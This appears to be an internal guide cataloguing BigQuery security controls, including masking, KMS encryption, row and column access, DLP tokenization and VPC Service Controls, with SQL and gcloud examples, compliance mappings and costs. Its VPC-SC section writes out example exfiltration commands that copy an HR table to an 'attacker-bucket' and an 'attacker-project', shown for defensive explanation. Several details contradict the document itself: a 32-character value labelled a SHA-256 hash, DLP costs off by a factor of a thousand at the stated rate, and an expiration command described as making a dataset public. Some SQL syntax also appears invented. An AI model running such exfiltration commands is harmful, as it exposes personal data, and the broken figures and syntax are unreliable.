# BigQuery Security Features Overview
## Comprehensive Guide to Data Protection & Access Control

**Document Version:** 1.0  
**Last Updated:** February 10, 2026  
**Audience:** Security Architects, Compliance Teams, Stakeholders  
**Purpose:** Feature catalog and capability reference

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [BigQuery Security Feature Catalog](#bigquery-security-feature-catalog)
3. [Dynamic Data Masking (DDM)](#dynamic-data-masking-ddm)
4. [Column-Level Encryption](#column-level-encryption)
5. [Row-Level Security (RLS)](#row-level-security-rls)
6. [Column-Level Access Control](#column-level-access-control)
7. [Data Tokenization](#data-tokenization)
8. [VPC Service Controls](#vpc-service-controls)
9. [Feature Comparison Matrix](#feature-comparison-matrix)
10. [Compliance Mapping](#compliance-mapping)
11. [Cost Estimates](#cost-estimates)
12. [Related Documentation](#related-documentation)

---

## Executive Summary

BigQuery provides comprehensive data security capabilities specifically designed for handling sensitive information including HR data, customer PII, and financial records. This document catalogs all available security features and provides guidance on which to use for different scenarios.

### Key Capabilities

**Data Protection:**
- ✅ Dynamic Data Masking (read-time obfuscation)
- ✅ Column-Level Encryption (KMS integration)
- ✅ Tokenization (Cloud DLP integration)
- ✅ Format-Preserving Encryption (via Cloud DLP)

**Access Control:**
- ✅ Row-Level Security (filter data by user/group)
- ✅ Column-Level Access Control (policy tags)
- ✅ IAM Roles & Permissions (project/dataset/table level)
- ✅ VPC Service Controls (network perimeter)

**Compliance:**
- ✅ GDPR Article 32 compliant (encryption at rest/transit)
- ✅ SOC 2 Type II controls
- ✅ ISO 27001 certified
- ✅ HIPAA eligible
- ✅ Audit logging for all data access

---

## BigQuery Security Feature Catalog

### Feature Overview Matrix

| Feature | GA Status | Use Case | Data at Rest | Performance Impact |
|---------|-----------|----------|--------------|-------------------|
| **Dynamic Data Masking** | ✅ GA | Multi-persona access | Plain text | Negligible (~5ms) |
| **Column Encryption (KMS)** | ✅ GA | High-sensitivity PII | Encrypted | Low (~100ms KMS call) |
| **Row-Level Security** | ✅ GA | Multi-tenancy | Plain text | Medium (scans all rows) |
| **Column-Level Access** | ✅ GA | Hide sensitive columns | Plain text | Negligible |
| **Cloud DLP Tokenization** | ✅ GA | Format preservation | Tokenized | Medium (API latency) |
| **VPC Service Controls** | ✅ GA | Data exfiltration prevention | N/A (network layer) | None |

---

## Dynamic Data Masking (DDM)

### What It Is

Real-time data obfuscation applied at query time based on user roles. Data stored in plain text but masked automatically when queried by unauthorized users.

### Key Capabilities

**Masking Rules Available:**
1. **Default Masking** - Returns NULL or default values
2. **Nullify** - Returns NULL for all types
3. **Hash (SHA-256)** - Deterministic hash (64-char hex)
4. **Last 4 Characters** - Shows `****************3456`
5. **First 4 Characters** - Shows `john*******************`
6. **Email Mask** - Shows `***@domain.com`
7. **Date Year Mask** - Truncates to year (2026-01-01)
8. **Custom Masking Routine** - User-defined function (UDF)

### Example Use Case

```sql
-- Create policy tag
-- (via Data Catalog UI or gcloud CLI)

-- Tag column
ALTER TABLE employees
ALTER COLUMN email
SET OPTIONS (policy_tags=['projects/.../policyTags/PII']);

-- Create masking rule
CREATE DATA POLICY mask_email_for_analysts
ON (SELECT policy_tag FROM `project.taxonomy.PII`)
MASKING RULE hash(email, "SHA256")
GRANT TO ("group:analysts@customer.com");

-- Grant full access to HR
GRANT `roles/datacatalog.categoryFineGrainedReader`
ON TAG `project.taxonomy.PII`
TO "group:hr-team@customer.com";
```

**Result:**
- Analysts query → See: `5d41402abc4b2a76b9719d911017c592`
- HR team query → See: `john.smith@customer.com`
- Data stored as: `john.smith@customer.com` (plain text)

### Benefits

✅ **No Data Duplication** - Single source of truth  
✅ **Real-Time Flexibility** - Change masking rules without data migration  
✅ **Multiple Views** - Different users see different representations  
✅ **Performance** - Negligible query overhead (~5-10ms)  
✅ **Compliance** - Reduces data exposure risk  

### Limitations

⚠️ **Data at Rest** - Stored in plain text (admins can see)  
⚠️ **Query Plan Visibility** - Masking rules visible in query plans  
⚠️ **Limited to 9 Policies** - Per policy tag  
⚠️ **Not True Encryption** - Obfuscation, not cryptographic protection  

### When to Use DDM

✅ Multiple user personas need different views of same data  
✅ Moderately sensitive data (employee emails, names)  
✅ Data frequently used in reports/dashboards  
✅ Need flexibility to change masking rules  
✅ Real-time analytics requirements  

### Reference
- [Introduction to Data Masking - BigQuery Docs](https://cloud.google.com/bigquery/docs/column-data-masking-intro)

---

## Column-Level Encryption

### What It Is

Cryptographic encryption of individual column values using Cloud KMS keys. Data stored as encrypted binary blobs, decrypted only when queried by authorized users.

### Encryption Methods

#### **1. KEYS.ENCRYPT() - Non-Deterministic**
```sql
-- Encrypt on INSERT
INSERT INTO employees (id, email_encrypted)
VALUES (
  123,
  KEYS.ENCRYPT(
    'projects/PROJECT/locations/LOCATION/keyRings/RING/cryptoKeys/KEY',
    'john.smith@customer.com',
    'AEAD_AES_GCM_256'
  )
);

-- Stored as: AwECAXhtB7Qx29vF... (binary blob)

-- Decrypt on SELECT
SELECT 
  id,
  KEYS.DECRYPT_STRING(
    'projects/PROJECT/locations/LOCATION/keyRings/RING/cryptoKeys/KEY',
    email_encrypted,
    'AEAD_AES_GCM_256'
  ) AS email
FROM employees;

-- Result: john.smith@customer.com (if user has KMS key access)
```

**Characteristics:**
- ❌ Same input → Different output each time
- ❌ Cannot JOIN on encrypted values
- ❌ Cannot GROUP BY encrypted values
- ✅ Maximum security (non-deterministic)

#### **2. KEYS.DETERMINISTIC_ENCRYPT() - Deterministic**
```sql
-- Encrypt (deterministic)
KEYS.DETERMINISTIC_ENCRYPT(
  key_path,
  'john.smith@customer.com',
  'AEAD_AES_SIV_CMAC_256'
)

-- Stored as: CyGECZjvD9SzU4oP... (always same for same input)
```

**Characteristics:**
- ✅ Same input → Same output (deterministic)
- ✅ Can JOIN on encrypted values
- ✅ Can GROUP BY encrypted values
- ✅ Can COUNT DISTINCT encrypted values
- ⚠️ Slightly less secure (pattern analysis possible)

### Cloud KMS Integration

**Envelope Encryption:**
```
Data Encryption Key (DEK) → Encrypts your data
         ↓
Key Encryption Key (KEK) → Encrypts the DEK (stored in Cloud KMS)
         ↓
Master Key → Stored in Cloud KMS HSM
```

**Access Control:**
- User needs: `bigquery.dataViewer` (to query table)
- User needs: `cloudkms.cryptoKeyDecrypter` (to decrypt data)
- Without both → Sees encrypted blob only

### Performance Characteristics

**Encryption Performance:**
- 1M rows × 4 columns: ~15 seconds
- Parallelized across BigQuery workers
- Minimal overhead

**Decryption Performance:**
- KMS API call: ~100ms (once per query)
- DEK cached in memory for query duration
- Decryption parallelized: ~12% overhead
- 1M rows query: 2.5s → 2.8s (acceptable)

### Benefits

✅ **True Encryption** - AES-256 cryptographic protection  
✅ **Data at Rest Security** - Admins see encrypted blobs only  
✅ **Key Control** - You manage encryption keys via Cloud KMS  
✅ **Compliance** - Meets GDPR Article 32, HIPAA requirements  
✅ **Audit Trail** - Every decrypt operation logged  
✅ **Deterministic Option** - Supports analytics on encrypted data  

### Limitations

⚠️ **Not Format-Preserving** - Output is binary blob  
⚠️ **Manual Decrypt** - Must explicitly call DECRYPT in queries  
⚠️ **Key Management** - Requires Cloud KMS setup and key rotation  
⚠️ **Query Complexity** - Decrypt logic in every query  

### When to Use Column Encryption

✅ High-sensitivity PII (SSN, bank accounts, medical records)  
✅ Regulatory requirement for encryption at rest  
✅ Need to prove admins cannot access data  
✅ Data rarely queried or only by specific users  
✅ Compliance audit requirements  

### Cost

**Cloud KMS Pricing:**
- Key storage: $0.06 per key per month
- Encrypt/decrypt operations: $0.03 per 10,000 operations
- Example: 1M encryptions = $3.00

**BigQuery Storage:**
- Same as regular BigQuery (encrypted data ~1.5x larger due to base64 encoding)

### Reference
- [Column-Level Encryption with Cloud KMS](https://cloud.google.com/bigquery/docs/column-key-encrypt)
- [AEAD Encryption Functions](https://cloud.google.com/bigquery/docs/reference/standard-sql/aead_encryption_functions)

---

## Row-Level Security (RLS)

### What It Is

Filter access to specific rows in a table based on user identity, group membership, or other conditions. Users only see rows they're authorized to access.

### Key Capabilities

**Row Access Policies:**
- Up to 100 policies per table
- SQL filter predicates (like WHERE clauses)
- Support for `SESSION_USER()` function
- Can reference lookup tables
- Applied automatically on all queries

### Example Use Cases

#### **1. Departmental Isolation**
```sql
-- Managers see only their department's employees
CREATE ROW ACCESS POLICY dept_managers
ON hr.employees
GRANT TO ('group:dept-managers@customer.com')
FILTER USING (
  department = (
    SELECT department 
    FROM hr.manager_assignments
    WHERE manager_email = SESSION_USER()
  )
);

-- Executives see all departments
CREATE ROW ACCESS POLICY exec_full_access
ON hr.employees
GRANT TO ('group:exec-team@customer.com')
FILTER USING (TRUE);
```

#### **2. Multi-Tenant SaaS**
```sql
-- Users see only their company's data
CREATE ROW ACCESS POLICY tenant_isolation
ON sales.orders
GRANT TO ('group:customers@customer.com')
FILTER USING (
  customer_id = (
    SELECT customer_id 
    FROM auth.user_tenants
    WHERE user_email = SESSION_USER()
  )
);
```

#### **3. Regional Data Compliance**
```sql
-- EU users can only see EU data (GDPR compliance)
CREATE ROW ACCESS POLICY gdpr_compliance
ON customer.transactions
GRANT TO ('group:eu-users@customer.com')
FILTER USING (data_region = 'EU');
```

### Performance Considerations

⚠️ **Important Limitation:**
- RLS policies do NOT support partition pruning
- BigQuery scans ALL rows even if filtering by date
- You pay for scanning entire table, not just visible rows

**Example:**
```sql
-- Table: 1 billion rows, partitioned by date
-- User has RLS policy: department = 'Sales'

SELECT * FROM employees WHERE date = '2026-02-10';

-- Without RLS: Scans 1 day partition = 1M rows
-- With RLS: Scans ALL partitions = 1B rows (then filters)
-- Cost: 1000x higher!
```

**Mitigation:**
- Use RLS on smaller tables (<100M rows)
- Combine with authorized views for large tables
- Consider materialized views per user group
- Apply clustering on RLS filter column

### Benefits

✅ **Granular Access Control** - Row-level precision  
✅ **Centralized Policies** - Defined once, applied everywhere  
✅ **Transparent to Users** - Works with existing queries  
✅ **Audit Trail** - Policy changes logged  
✅ **Flexible Logic** - Any SQL filter expression  

### Limitations

⚠️ **No Partition Pruning** - Scans all data  
⚠️ **Performance Impact** - Can be significant on large tables  
⚠️ **Policy Limit** - Max 100 policies per table  
⚠️ **No Subquery Support** - Limited in some filter expressions  
⚠️ **Infrastructure as Code** - Must be managed via scripts  

### When to Use RLS

✅ Multi-tenant applications  
✅ Departmental data isolation  
✅ Regional compliance requirements (GDPR)  
✅ Small to medium datasets (<100M rows)  
✅ When authorized views are too complex to manage  

### Reference
- [Row-Level Security Overview](https://cloud.google.com/bigquery/docs/row-level-security-intro)

---

## Column-Level Access Control

### What It Is

Control access to specific columns using Data Catalog policy tags. Users without proper permissions see NULL values for restricted columns.

### Key Capabilities

**Policy Tags:**
- Create taxonomies in Data Catalog
- Assign tags to BigQuery columns
- Grant Fine-Grained Reader role for access
- Works across BigQuery, BigLake, Cloud Spanner

### Example Taxonomy

```
HR Data Classification
├── HR-Critical (SSN, Bank Details)
│   └── Only HR Director can access
├── HR-Sensitive (Salary, Performance)
│   └── HR Managers can access
├── HR-General (Department, Job Title)
│   └── All managers can access
└── HR-Public (Employee ID, Name)
    └── All employees can access
```

### Implementation

```sql
-- Step 1: Create taxonomy (via Data Catalog)
-- projects/PROJECT/locations/LOCATION/taxonomies/hr-taxonomy

-- Step 2: Apply policy tag to column
ALTER TABLE employees
ALTER COLUMN salary
SET OPTIONS (
  policy_tags=['projects/PROJECT/locations/LOCATION/taxonomies/hr-taxonomy/policyTags/HR-Sensitive']
);

-- Step 3: Grant access to specific users
GRANT `roles/datacatalog.categoryFineGrainedReader`
ON TAG `projects/PROJECT/locations/LOCATION/taxonomies/hr-taxonomy/policyTags/HR-Sensitive`
TO "group:hr-managers@customer.com";
```

**Result:**
- HR managers query → See salary values
- Other employees query → See NULL for salary column
- Schema visible to all, values restricted

### Benefits

✅ **Column-Level Granularity** - Hide specific sensitive fields  
✅ **Centralized Management** - One taxonomy for all tables  
✅ **Schema Visibility** - Users see column exists but not values  
✅ **Works with Masking** - Can combine with DDM  
✅ **Cross-Service** - Works beyond BigQuery  

### Limitations

⚠️ **Manual Tagging** - Must tag each column in each table  
⚠️ **No Inheritance** - Tags don't apply to views automatically  
⚠️ **Data Catalog Dependency** - Requires Data Catalog setup  
⚠️ **Learning Curve** - Additional concept to understand  

### When to Use Column-Level Access

✅ Need to hide entire columns from users  
✅ Multiple tables with same sensitive column types  
✅ Want centralized policy management  
✅ Building data catalog/governance program  

### Reference
- [Column-Level Security Introduction](https://cloud.google.com/bigquery/docs/column-level-security-intro)

---

## Data Tokenization

### What It Is

Replace sensitive data with non-sensitive tokens using Cloud DLP. Tokens can be format-preserving or random, reversible or irreversible.

### Tokenization Methods

#### **1. Format-Preserving Encryption (FPE)**
```
Input: john.smith@customer.com
Output: ahtq.kpzmr@customer.com (still looks like email!)
```

#### **2. Crypto Hash Tokenization**
```
Input: john.smith@customer.com
Output: TOKEN(EMAIL):5d41402abc4b2a76b9719d911017c592
```

#### **3. Pseudonymization**
```
Input: John Smith
Output: PersonA_12345
```

#### **4. Generalization/Bucketing**
```
Input: Salary = £75,000
Output: Salary Range = £70,000-£80,000
```

### Cloud DLP Integration

**Two Approaches:**

#### **A. Batch Tokenization (Dataflow)**
```
CSV in GCS → Dataflow + DLP API → Tokenized CSV → BigQuery
```

**Use for:**
- Initial data load
- Periodic refresh of dev/test environments
- Large-scale data migration

#### **B. Real-Time Tokenization (Remote Functions)**
```sql
-- Create remote function that calls Cloud Run (DLP wrapper)
CREATE FUNCTION tokenize_email(email STRING)
RETURNS STRING
REMOTE WITH CONNECTION `project.region.dlp-connection`
OPTIONS (endpoint = 'https://dlp-function-xxx.run.app/tokenize');

-- Use in queries
SELECT tokenize_email(email) AS email_token
FROM raw_data;
```

**Use for:**
- On-demand tokenization
- Dynamic data masking alternative
- Small datasets

#### **C. Built-In BigQuery Functions (NEW - Jan 2025)**
```sql
-- Native tokenization (compatible with Cloud DLP)
SELECT DLP.TOKENIZE(
  'projects/PROJECT/locations/LOCATION/deidentifyTemplates/TEMPLATE',
  email
) AS email_tokenized
FROM raw_data;
```

**Benefits:**
- No external API calls
- Built into BigQuery engine
- High performance
- Interoperable with Cloud DLP

### De-Identification Techniques

**Available in Cloud DLP:**
1. **Masking** - Replace with asterisks
2. **Redaction** - Remove entirely
3. **Replacement** - Replace with placeholder
4. **Crypto-based tokenization** - Reversible encryption
5. **Date shifting** - Shift dates by random offset
6. **Bucketing** - Generalize to ranges
7. **Time extraction** - Extract only time portion

### Performance & Cost

**Cloud DLP API Pricing:**
- Inspection: $1 per 1,000,000 bytes
- De-identification: $1 per 1,000,000 bytes
- First 1TB/month free for Data Profiling

**Example Cost:**
- 1M rows × 4 PII columns × 100 bytes = 400MB
- Inspection cost: $0.40
- Tokenization cost: $0.40
- Total: $0.80

**Performance:**
- API latency: ~50-100ms per request
- Batch processing: ~10,000 rows/minute
- BigQuery native: Much faster (similar to encryption)

### Benefits

✅ **Format Preservation** - Maintains data structure  
✅ **Auto-Detection** - Identifies 150+ PII types automatically  
✅ **Flexible Techniques** - Multiple de-identification options  
✅ **Reversible or Irreversible** - Choose based on needs  
✅ **Compliance** - Meets GDPR, CCPA de-identification standards  

### Limitations

⚠️ **Cost** - More expensive than KMS encryption  
⚠️ **Performance** - Slower than native BigQuery functions  
⚠️ **Complexity** - Requires DLP API setup and templates  
⚠️ **API Dependency** - External service dependency  

### When to Use Cloud DLP Tokenization

✅ Need format-preserving encryption  
✅ Don't know which columns contain PII (auto-detect)  
✅ Unstructured data with mixed PII  
✅ Complex de-identification requirements  
✅ Compliance requires specific tokenization methods  

### Reference
- [Cloud DLP De-identification](https://cloud.google.com/sensitive-data-protection/docs/deidentify-sensitive-data)
- [Built-in Tokenization (Jan 2025)](https://cloud.google.com/blog/products/identity-security/get-started-with-built-in-tokenization-for-sensitive-data-protection)

---

## VPC Service Controls

### What It Is

Network-level security perimeter that prevents data exfiltration from BigQuery and other Google Cloud services. Blocks unauthorized data copying even with valid IAM permissions.

### Key Capabilities

**Service Perimeters:**
- Define boundary around GCP projects
- Restrict access to BigQuery, GCS, etc.
- Block data copying to external projects
- Allow access only from authorized networks

**Access Levels:**
- IP address ranges (corporate network)
- Device attributes (managed devices only)
- Identity context (specific users/groups)
- Geographic location

**Ingress/Egress Rules:**
- Control what data can enter perimeter
- Control what data can leave perimeter
- Granular per-service, per-operation

### Attack Vectors Prevented

#### **1. Malicious Data Copy**
```bash
# Without VPC-SC: Works
bq extract prod_hr.employees gs://attacker-bucket/stolen.csv

# With VPC-SC: Blocked
# ERROR: VPC Service Controls: Request prohibited by organization policy
```

#### **2. Compromised Credentials**
```bash
# Attacker steals service account key, uses from home
# Without VPC-SC: Works (valid credentials)
# With VPC-SC: Blocked (source IP not in allowed range)
```

#### **3. Cross-Project Exfiltration**
```sql
-- Attacker tries to copy data to their personal project
CREATE TABLE attacker-project.dataset.stolen AS
SELECT * FROM prod_hr.employees;

-- VPC-SC blocks: Cannot write to resource outside perimeter
```

#### **4. Public Dataset Exposure**
```bash
# Admin accidentally makes dataset public
bq update --dataset prod_hr --set_default_table_expiration 0

# VPC-SC prevents external access even if IAM allows
```

### Implementation Example

```bash
# Step 1: Create access level (corporate network only)
gcloud access-context-manager levels create corporate-network \
  --title="customer Corporate Network" \
  --basic-level-spec=access-level.yaml \
  --policy=customer-access-policy

# access-level.yaml:
# - ipSubnetworks:
#   - 192.168.1.0/24  # London office
#   - 10.0.0.0/16     # VPN range

# Step 2: Create service perimeter
gcloud access-context-manager perimeters create hr-data-perimeter \
  --title="HR Sensitive Data" \
  --resources=projects/123456789 \
  --restricted-services=bigquery.googleapis.com,storage.googleapis.com \
  --access-levels=corporate-network \
  --policy=customer-access-policy

# Step 3: Test in dry-run mode (logs violations, doesn't block)
gcloud access-context-manager perimeters update hr-data-perimeter \
  --set-enforcement-mode=dryrun \
  --policy=customer-access-policy

# Step 4: Review violations, adjust policies

# Step 5: Enforce
gcloud access-context-manager perimeters update hr-data-perimeter \
  --set-enforcement-mode=enforced \
  --policy=customer-access-policy
```

### Monitoring VPC-SC Violations

```sql
-- Query audit logs for VPC-SC violations
SELECT
  timestamp,
  protoPayload.authenticationInfo.principalEmail as user,
  protoPayload.metadata.violationReason,
  protoPayload.resourceName as blocked_resource,
  protoPayload.methodName as attempted_action
FROM
  `project.logs.cloudaudit_googleapis_com_data_access`
WHERE
  protoPayload.metadata.violationReason IS NOT NULL
  AND DATE(timestamp) >= CURRENT_DATE() - 7
ORDER BY timestamp DESC;
```

### Benefits

✅ **Data Exfiltration Prevention** - Blocks unauthorized copying  
✅ **Defense in Depth** - Works even if IAM misconfigured  
✅ **Network-Level Control** - Independent of application logic  
✅ **Insider Threat Mitigation** - Prevents malicious admin actions  
✅ **Compliance** - Meets data residency requirements  

### Limitations

⚠️ **Complexity** - Requires careful planning and testing  
⚠️ **Operational Impact** - Can block legitimate workflows  
⚠️ **Dry-Run Required** - Must test before enforcing  
⚠️ **Integration Challenges** - May break existing integrations  

### When to Use VPC Service Controls

✅ Highly sensitive data (HR, financial, medical)  
✅ Regulatory requirements (GDPR, HIPAA)  
✅ Insider threat concerns  
✅ Need to prove data cannot be exfiltrated  
✅ Multi-tenant environments  

### Reference
- [VPC Service Controls Overview](https://cloud.google.com/vpc-service-controls/docs/overview)
- [VPC-SC for BigQuery](https://cloud.google.com/bigquery/docs/vpc-sc)

---

## Feature Comparison Matrix

### Security Features Side-by-Side

| Feature | Data at Rest | Prevents Admin Access? | Format Preserved? | Performance | Cost | Complexity |
|---------|--------------|----------------------|-------------------|-------------|------|-----------|
| **Dynamic Data Masking** | Plain text | ❌ No | ❌ No (masked) | ⚡ Very Fast | Free | ⭐ Low |
| **Column Encryption (KMS)** | Encrypted | ✅ Yes | ❌ No (binary blob) | ⚡ Fast | $ Low | ⭐⭐ Medium |
| **Cloud DLP Tokenization** | Tokenized | ✅ Yes | ✅ Optional | ⚡ Medium | $$ Medium | ⭐⭐⭐ High |
| **Row-Level Security** | Plain text | ❌ No | ✅ Yes | ⚠️ Can be slow | Free | ⭐⭐ Medium |
| **Column-Level Access** | Plain text | ❌ No | ✅ Yes (NULL if denied) | ⚡ Very Fast | Free | ⭐⭐ Medium |
| **VPC Service Controls** | N/A | ✅ Yes (blocks exfil) | ✅ Yes | ⚡ Very Fast | Free | ⭐⭐⭐ High |

### Use Case Mapping

| Use Case | Recommended Features | Alternative Options |
|----------|---------------------|---------------------|
| **Employee audit trails** | DDM (hash) | No masking + access control |
| **SSN / National Insurance** | KMS Encryption | Cloud DLP (format-preserving) |
| **Salary information** | KMS Encryption + RLS | DDM (nullify for non-HR) |
| **Bank account details** | KMS Encryption | Cloud DLP (irreversible) |
| **Performance reviews** | KMS Encryption + RLS | DDM + Column Access Control |
| **Department names** | No masking | DDM if multi-tenant |
| **Multi-tenant SaaS** | RLS + VPC-SC | Separate datasets per tenant |
| **Dev/Test environments** | Cloud DLP (tokenization) | KMS Encryption + key separation |
| **External auditor access** | DDM (custom masking) | Authorized views |
| **Regulatory compliance** | KMS + VPC-SC + Audit Logs | Full encryption + monitoring |

---

## Compliance Mapping

### GDPR (General Data Protection Regulation)

**Article 32: Security of Processing**
> "Appropriate technical and organisational measures to ensure a level of security appropriate to the risk"

**BigQuery Features That Help:**
- ✅ **Encryption at Rest** - Default Google-managed or CMEK
- ✅ **Encryption in Transit** - TLS 1.2+
- ✅ **Pseudonymization** - Cloud DLP tokenization
- ✅ **Access Controls** - IAM, RLS, Column-level security
- ✅ **Audit Logging** - All data access logged
- ✅ **Data Minimization** - DDM shows only necessary data

**Article 17: Right to Erasure**
- ✅ **Crypto-Shredding** - Delete KMS key to make data unreadable
- ✅ **DML Operations** - DELETE statements with audit trail

**Article 25: Data Protection by Design**
- ✅ **Default Encryption** - All data encrypted by default
- ✅ **Granular Controls** - Row/column level access
- ✅ **Privacy-Preserving Analytics** - DDM for masked reporting

---

### SOC 2 Type II

**CC6.1: Logical Access Controls**
- ✅ **IAM Roles** - Least privilege principle
- ✅ **MFA Enforcement** - via Google Cloud Identity
- ✅ **Access Reviews** - Audit logs + IAM recommender

**CC6.6: Encryption**
- ✅ **Data at Rest** - AES-256 encryption
- ✅ **Data in Transit** - TLS encryption
- ✅ **Key Management** - CMEK with Cloud KMS

**CC6.7: Segregation of Duties**
- ✅ **Separate Roles** - Admin ≠ Data Access
- ✅ **Break-Glass** - Emergency access with approval

**CC7.2: Monitoring**
- ✅ **Audit Logs** - All access logged
- ✅ **Real-Time Alerts** - Cloud Monitoring integration
- ✅ **SIEM Integration** - Export to Splunk, Chronicle, etc.

---

### HIPAA (Health Insurance Portability and Accountability Act)

**§164.312(a)(2)(iv): Encryption and Decryption**
- ✅ **Encryption** - KMS column-level encryption
- ✅ **Access Control** - Role-based access to PHI
- ✅ **Audit Trail** - All PHI access logged

**§164.308(a)(3): Workforce Security**
- ✅ **Authorization** - IAM roles and permissions
- ✅ **Termination Procedures** - Auto-revoke on offboarding
- ✅ **Access Reviews** - Regular certification

**§164.308(a)(1)(ii)(D): Information System Activity Review**
- ✅ **Audit Logs** - 400-day retention
- ✅ **Monitoring** - Real-time access tracking
- ✅ **Reporting** - Security dashboard

---

### PCI DSS (Payment Card Industry Data Security Standard)

**Requirement 3: Protect Stored Cardholder Data**
- ✅ **Strong Cryptography** - AES-256 via KMS
- ✅ **Truncation** - DDM last 4 characters
- ✅ **Tokenization** - Cloud DLP tokenization

**Requirement 7: Restrict Access**
- ✅ **Need-to-Know** - IAM least privilege
- ✅ **User Authentication** - Google Cloud Identity
- ✅ **Access Logging** - All access audited

**Requirement 10: Track and Monitor**
- ✅ **Audit Trails** - Comprehensive logging
- ✅ **Log Protection** - Immutable audit logs
- ✅ **Review** - Automated alerting

---

### ISO 27001

**A.9.2: User Access Management**
- ✅ **Access Provisioning** - IAM policies
- ✅ **Access Reviews** - Regular certification
- ✅ **Access Revocation** - Immediate on termination

**A.10.1: Cryptographic Controls**
- ✅ **Encryption Policy** - KMS key management
- ✅ **Key Lifecycle** - Automatic rotation
- ✅ **Key Access** - Separate from data access

**A.12.4: Logging and Monitoring**
- ✅ **Event Logging** - All access events
- ✅ **Clock Synchronization** - NTP sync
- ✅ **Log Protection** - Tamper-proof logs

---

## Cost Estimates

### Scenario: 10M Row HR Dataset with 5 PII Columns

#### **Option 1: Dynamic Data Masking**
```
Setup: Free (policy tags + masking rules)
Monthly: $0 (no additional cost)
Query: Standard BigQuery pricing (no overhead)

Total Monthly: ~$50 (storage + queries)
```

#### **Option 2: Column Encryption (KMS)**
```
KMS Key Storage: $0.06 × 1 key = $0.06/month
Initial Encryption: 10M × 5 cols × $0.03/10K = $150 one-time
Monthly Decrypts: 1000 queries × $0.03/10K = $0.03/month
BigQuery Storage: ~$60/month (1.5x due to base64 encoding)
BigQuery Queries: ~$50/month

Total One-Time: $150
Total Monthly: $110
```

#### **Option 3: Cloud DLP Tokenization**
```
Initial Inspection: 10M × 5 × 100 bytes × $1/1M bytes = $5,000
Initial Tokenization: 10M × 5 × 100 bytes × $1/1M bytes = $5,000
Monthly Re-tokenization: $0 (one-time for prod, monthly for dev)
BigQuery Storage: ~$50/month
BigQuery Queries: ~$50/month

Total One-Time: $10,000
Total Monthly: $100
```

#### **Option 4: Row-Level Security**
```
Setup: Free
Monthly: $0 (no additional cost)
Query: Standard BigQuery pricing
Warning: May scan 10-100x more data than necessary

Total Monthly: $500-$5,000 (depending on query patterns)
```

#### **Option 5: VPC Service Controls**
```
Setup: Free
Monthly: Free
No additional costs

Total Monthly: $0
```

### Cost Optimization Tips

1. **Use DDM for moderate sensitivity** - Zero incremental cost
2. **Use deterministic encryption** - Enables analytics without decryption
3. **Partition tables** - Reduce query costs
4. **Cluster on filter columns** - Improve RLS performance
5. **Materialize encrypted views** - Cache decrypted results
6. **Use BigQuery native tokenization** - Avoid DLP API costs
7. **Batch DLP operations** - Process in bulk vs. row-by-row
8. **Enable caching** - Reuse query results
9. **Monitor query costs** - Set budget alerts
10. **Use slots reservations** - Predictable pricing for high-volume

---

## Related Documentation

### Internal Documents
- [Zero-Trust IAM Implementation Guide](./2-zero-trust-iam-strategy.md) - Advanced security architecture
- [customer Implementation Guide](./3-customer-implementation-guide.md) - Your specific data pipeline

### Google Cloud Documentation
- [BigQuery Security Best Practices](https://cloud.google.com/bigquery/docs/best-practices-security)
- [Data Governance in BigQuery](https://cloud.google.com/bigquery/docs/data-governance)
- [Encryption at Rest](https://cloud.google.com/bigquery/docs/encryption-at-rest)

### Compliance Resources
- [GDPR Compliance on Google Cloud](https://cloud.google.com/privacy/gdpr)
- [HIPAA on Google Cloud](https://cloud.google.com/security/compliance/hipaa)
- [PCI DSS on Google Cloud](https://cloud.google.com/security/compliance/pci-dss)
- [ISO 27001 Certification](https://cloud.google.com/security/compliance/iso-27001)

---

## Appendix: Quick Reference

### Decision Tree: Which Feature to Use?

```
Start: Do you need to protect data?
├── Yes
│   ├── Is data highly sensitive? (SSN, bank account, medical)
│   │   ├── Yes → Use KMS Encryption + VPC-SC
│   │   └── No → Continue
│   ├── Do multiple personas need different views?
│   │   ├── Yes → Use Dynamic Data Masking
│   │   └── No → Continue
│   ├── Is data used in frequent reports?
│   │   ├── Yes → Use Dynamic Data Masking
│   │   └── No → Use KMS Encryption
│   └── Is compliance mandatory?
│       ├── Yes → Use KMS + VPC-SC + Audit Logs
│       └── No → Use Dynamic Data Masking
└── No → Use IAM + Access Controls only
```

### Common Patterns

**Pattern 1: Multi-Tier Security**
```
Layer 1: IAM (who can query)
Layer 2: RLS (which rows)
Layer 3: Column Access (which columns)
Layer 4: DDM (what values they see)
```

**Pattern 2: Maximum Security**
```
Layer 1: VPC-SC (network perimeter)
Layer 2: IAM (project/dataset access)
Layer 3: KMS Encryption (data at rest)
Layer 4: Audit Logging (monitoring)
```

**Pattern 3: Balanced Approach**
```
High Sensitivity: KMS Encryption
Medium Sensitivity: Dynamic Data Masking
Low Sensitivity: IAM + Access Controls
```

---

**Document Version:** 1.0  
**Last Updated:** February 10, 2026  
**Next Review:** May 10, 2026  
**Maintained By:** Data Security Team + Solutions Architecture
